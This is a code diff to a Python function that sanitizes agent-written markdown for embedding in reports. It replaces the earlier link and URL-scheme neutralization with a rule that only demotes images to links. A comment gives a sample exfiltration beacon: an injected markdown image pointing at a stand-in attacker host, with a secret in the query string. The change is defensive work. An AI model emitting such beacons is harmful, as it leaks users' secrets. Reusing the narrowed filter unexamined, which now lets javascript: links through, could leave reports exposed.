@@ -64,26 +64,26 @@ def _soft_wrap_cell_line(text: str, width: int) -> str:
 _HTML_TAG_OPEN_RE = re.compile(r"<(?=[A-Za-z/!])")
 _SHALLOW_HEADING_RE = re.compile(r"^#{1,2}(?=\s)")
 _INLINE_CODE_SPLIT_RE = re.compile(r"(`[^`]*`)")
-_MARKDOWN_IMAGE_RE = re.compile(r"!\[([^\]]*)\]\([^)\n]*\)")
-_MARKDOWN_LINK_RE = re.compile(r"\[([^\]\n]+)\]\([^)\n]*\)")
-_URL_SCHEME_RE = re.compile(r"\b(?:https?|ftp|file|data|javascript):(?://)?", re.IGNORECASE)
-
-
-def _neutralize_markdown_urls(text: str) -> str:
-    text = _MARKDOWN_IMAGE_RE.sub(lambda match: f"[image removed: {match.group(1).strip()}]", text)
-    text = _MARKDOWN_LINK_RE.sub(lambda match: match.group(1), text)
-    return _URL_SCHEME_RE.sub(lambda match: match.group(0).replace(":", "[:]"), text)
+# Markdown images auto-fetch their URL on render, so an injected
+# ``![](https://attacker/?d=<secret>)`` is a zero-click exfiltration beacon.
+# Demote the image to a plain link (drop the leading ``!``): no fetch happens
+# until a human clicks, and the URL stays visible for inspection.
+_IMAGE_MARKER_RE = re.compile(r"!(?=\[)")
 
 
 def sanitize_agent_markdown(text: str) -> str:
     """Neutralize agent-authored markdown for verbatim embedding in a report.
 
     Raw HTML openers are escaped (an injected ``<script>``/``<img onerror>``
-    must not survive into HTML-rendered reports) and h1/h2 headings are demoted
-    to h3 so the embedded block cannot restructure the host document. Inline
-    code spans and fenced blocks are left untouched — quoted commands keep
-    their ``<`` characters.
+    must not survive into HTML-rendered reports), markdown image markers are
+    demoted to links so no URL auto-fetches, and h1/h2 headings are demoted to
+    h3 so the embedded block cannot restructure the host document. Inline code
+    spans and fenced blocks are left untouched — quoted commands keep their
+    ``<`` characters.
     """
+
+    def _neutralize(part: str) -> str:
+        return _IMAGE_MARKER_RE.sub("", _HTML_TAG_OPEN_RE.sub("&lt;", part))
 
     lines: list[str] = []
     fence_marker = ""  # e.g. "```" or "~~~~": only the SAME marker (>= length) closes a fence
@@ -103,12 +103,7 @@ def sanitize_agent_markdown(text: str) -> str:
             continue
         line = _SHALLOW_HEADING_RE.sub("###", line)
         parts = _INLINE_CODE_SPLIT_RE.split(line)
-        lines.append(
-            "".join(
-                part if part.startswith("`") else _neutralize_markdown_urls(_HTML_TAG_OPEN_RE.sub("&lt;", part))
-                for part in parts
-            )
-        )
+        lines.append("".join(part if part.startswith("`") else _neutralize(part) for part in parts))
     return "\n".join(lines)
 
 
